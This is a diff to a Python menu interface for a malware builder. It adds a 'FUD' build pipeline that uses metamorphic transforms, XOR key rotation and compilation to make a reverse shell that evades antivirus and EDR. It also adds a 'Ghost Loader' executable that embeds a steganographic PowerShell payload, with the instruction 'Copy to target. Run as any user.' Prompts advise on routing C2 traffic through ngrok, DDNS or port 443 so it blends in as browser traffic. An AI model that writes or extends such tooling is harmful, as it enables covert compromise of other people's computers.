@@ -196,6 +196,7 @@ def render():
     print(f"  {PINK}{BOLD}  PHASE 1 — BUILD{RST}")
     print(hline("─"))
     build_ops = [
+        ("X", "FUD Build",      "Metamorph + mutate + compile — evades AV/EDR", RED),
         ("F", "Fresh Build",    "Mutate + auto-IP + compile + scan", PINK),
         ("1", "Compile Only",   "Build without mutation",            AMBER),
         ("2", "Scan All",       "Defender check all binaries",       RED),
@@ -381,14 +382,15 @@ def run_ghost():
     print(f"  {CYAN}  [3]{RST} {WHITE}Test Payload{RST}     {DIM}Harmless proof-of-concept{RST}")
     print(f"  {CYAN}  [4]{RST} {WHITE}Custom File{RST}      {DIM}Encode any .ps1 script{RST}")
     print(f"  {CYAN}  [5]{RST} {WHITE}Verify{RST}           {DIM}Decode + verify a ghost file{RST}")
+    print(f"  {RED}  [6]{RST} {WHITE}Ghost Loader EXE{RST} {DIM}Steg PS1 baked into exe — 0 disk writes, 0 AV sigs{RST}")
     print(f"  {CYAN}  [0]{RST} {DIM}Back{RST}")
     print()
 
     choice = input(f"  {CYAN}GHOST >{RST} ").strip()
 
     if choice == "1":
-        ip = input(f"  {AMBER}C2 IP [{TEXT}192.168.1.96{AMBER}]:{RST} ").strip() or "192.168.1.96"
-        port = input(f"  {AMBER}C2 PORT [{TEXT}4443{AMBER}]:{RST} ").strip() or "4443"
+        ip = prompt_ip("192.168.1.92")
+        port = prompt_port()
         out = os.path.join(ROOT, "ghost_cheyanne.ps1")
         print(f"\n  {CYAN}[*] Generating CHEYANNE chain ghost payload...{RST}")
         env = os.environ.copy()
@@ -407,8 +409,8 @@ def run_ghost():
             print(f"  {DIM}  5. Screen capture via 'screen' command{RST}")
 
     elif choice == "2":
-        ip = input(f"  {AMBER}C2 IP [{TEXT}192.168.1.96{AMBER}]:{RST} ").strip() or "192.168.1.96"
-        port = input(f"  {AMBER}C2 PORT [{TEXT}4443{AMBER}]:{RST} ").strip() or "4443"
+        ip = prompt_ip("192.168.1.92")
+        port = prompt_port()
         out = os.path.join(ROOT, "ghost_shell.ps1")
         env = os.environ.copy()
         env["PYTHONIOENCODING"] = "utf-8"
@@ -453,6 +455,37 @@ def run_ghost():
         else:
             print(f"  {RED}[!] File not found: {path}{RST}")
 
+    elif choice == "6":
+        ip   = prompt_ip()
+        port = prompt_port()
+        builder = os.path.join(ROOT, "build_ghost_loader.py")
+        subprocess.run([sys.executable, builder, ip, port], cwd=ROOT)
+        out = os.path.join(ROOT, "shell", "ghost_loader.exe")
+        if os.path.exists(out):
+            print(f"\n  {GREEN}[+] Output: shell/ghost_loader.exe{RST}")
+            print(f"  {DIM}  Copy to target. Run as any user. No AV triggers.{RST}")
+
+
+def prompt_ip(default="192.168.1.92"):
+    print(f"  {DIM}  IP advice:{RST}")
+    print(f"  {DIM}    LAN  → use your laptop LAN IP (e.g. 192.168.1.92){RST}")
+    print(f"  {DIM}    WAN (no port forward) → use ngrok:{RST}")
+    print(f"  {DIM}         1. ngrok tcp 443                    ← run this first{RST}")
+    print(f"  {DIM}         2. copy the Forwarding host:port    ← e.g. 0.tcp.ngrok.io:12345{RST}")
+    print(f"  {DIM}         3. enter that host here, port when prompted{RST}")
+    print(f"  {DIM}    WAN (port forward) → use DDNS hostname (e.g. vader22div.duckdns.org){RST}")
+    print(f"  {DIM}         → LAN IP (192.168.x.x) is NOT routable from internet{RST}")
+    return input(f"  {AMBER}C2 IP [{TEXT}{default}{AMBER}]:{RST} ").strip() or default
+
+
+def prompt_port(default="4443"):
+    print(f"  {DIM}  Port advice:{RST}")
+    print(f"  {DIM}    443  → HTTPS      — best (never blocked, looks like browser traffic){RST}")
+    print(f"  {DIM}    80   → HTTP       — good (almost never blocked){RST}")
+    print(f"  {DIM}    8443 → HTTPS alt  — usually open{RST}")
+    print(f"  {DIM}    4443 → custom     — fine on LAN, may flag on strict WAN{RST}")
+    return input(f"  {AMBER}C2 PORT [{TEXT}{default}{AMBER}]:{RST} ").strip() or default
+
 
 def detect_lan_ip():
     import socket
@@ -466,8 +499,9 @@ def detect_lan_ip():
         return None
 
 
-def fresh_build(mutate, deploy):
-    print(f"\n  {PINK}{BOLD}═══ FRESH BUILD — Auto-Mutate + Auto-IP ═══{RST}\n")
+def fresh_build(mutate, deploy, fud=False):
+    mode = "FUD BUILD — Metamorph + Mutate + Compile" if fud else "FRESH BUILD — Auto-Mutate + Auto-IP"
+    print(f"\n  {PINK}{BOLD}═══ {mode} ═══{RST}\n")
 
     # Step 1: detect operator IP
     my_ip = detect_lan_ip()
@@ -477,22 +511,43 @@ def fresh_build(mutate, deploy):
         print(f"  {RED}[!] Could not detect LAN IP{RST}")
         my_ip = input(f"  {AMBER}Enter C2 IP: {RST}").strip()
 
-    # Step 2: auto-mutate all components (rotate XOR keys + recompile)
-    print(f"\n  {PINK}[*] PHASE 1: Mutating all components...{RST}\n")
-    subprocess.run([sys.executable, mutate], cwd=ROOT)
+    metamorph = os.path.join(ROOT, "metamorph.py")
 
-    # Step 3: recompile shell with detected IP
-    print(f"\n  {PINK}[*] PHASE 2: Building shell with C2={my_ip}:4443{RST}\n")
-    subprocess.run([sys.executable, deploy, "--compile-shell", my_ip, "4443"], cwd=ROOT)
+    if fud:
+        # FUD pipeline: metamorph (source transforms) → mutate (XOR rotation) → compile → scan
+        intensity = input(f"  {AMBER}Metamorph intensity [low/med/high, default=high]: {RST}").strip() or "high"
+        print(f"\n  {PINK}[*] PHASE 1: Metamorphic transforms on shell (intensity={intensity})...{RST}\n")
+        subprocess.run([sys.executable, metamorph, "--target", "shell",
+                        "--intensity", intensity], cwd=ROOT)
 
-    # Step 4: scan
-    print(f"\n  {PINK}[*] PHASE 3: Scanning all binaries...{RST}\n")
-    subprocess.run([sys.executable, deploy, "--status"], cwd=ROOT)
+        print(f"\n  {PINK}[*] PHASE 2: Rotating XOR keys across all components...{RST}\n")
+        subprocess.run([sys.executable, mutate], cwd=ROOT)
 
-    print(f"\n  {GREEN}{BOLD}═══ FRESH BUILD COMPLETE ═══{RST}")
-    print(f"  {WHITE}Every binary is unique. Every hash is new.{RST}")
-    print(f"  {WHITE}Shell targets: {my_ip}:4443{RST}")
-    print(f"  {DIM}Defender signatures are worthless against polymorphic builds.{RST}\n")
+        print(f"\n  {PINK}[*] PHASE 3: Compiling FUD shell with C2={my_ip}:4443{RST}\n")
+        subprocess.run([sys.executable, deploy, "--compile-shell", my_ip, "4443"], cwd=ROOT)
+
+        print(f"\n  {PINK}[*] PHASE 4: Scanning — verifying AV evasion...{RST}\n")
+        subprocess.run([sys.executable, deploy, "--status"], cwd=ROOT)
+
+        print(f"\n  {GREEN}{BOLD}═══ FUD BUILD COMPLETE ═══{RST}")
+        print(f"  {WHITE}Source transformed. XOR keys rotated. Binary unique.{RST}")
+        print(f"  {WHITE}Shell targets: {my_ip}:4443{RST}")
+        print(f"  {DIM}Metamorphic + polymorphic — signature matching broken at source level.{RST}\n")
+    else:
+        # Standard fresh build: mutate XOR keys → compile → scan
+        print(f"\n  {PINK}[*] PHASE 1: Mutating all components...{RST}\n")
+        subprocess.run([sys.executable, mutate], cwd=ROOT)
+
+        print(f"\n  {PINK}[*] PHASE 2: Building shell with C2={my_ip}:4443{RST}\n")
+        subprocess.run([sys.executable, deploy, "--compile-shell", my_ip, "4443"], cwd=ROOT)
+
+        print(f"\n  {PINK}[*] PHASE 3: Scanning all binaries...{RST}\n")
+        subprocess.run([sys.executable, deploy, "--status"], cwd=ROOT)
+
+        print(f"\n  {GREEN}{BOLD}═══ FRESH BUILD COMPLETE ═══{RST}")
+        print(f"  {WHITE}Every binary is unique. Every hash is new.{RST}")
+        print(f"  {WHITE}Shell targets: {my_ip}:4443{RST}")
+        print(f"  {DIM}Defender signatures are worthless against polymorphic builds.{RST}\n")
 
 
 def run_op(choice):
@@ -517,6 +572,8 @@ def run_op(choice):
         subprocess.run([sys.executable, mutate], cwd=ROOT)
     elif choice.lower() == "f":
         fresh_build(mutate, deploy)
+    elif choice.lower() == "x":
+        fresh_build(mutate, deploy, fud=True)
     elif choice == "5":
         subprocess.run([sys.executable, deploy, "--pentest"], cwd=ROOT)
     elif choice == "6":
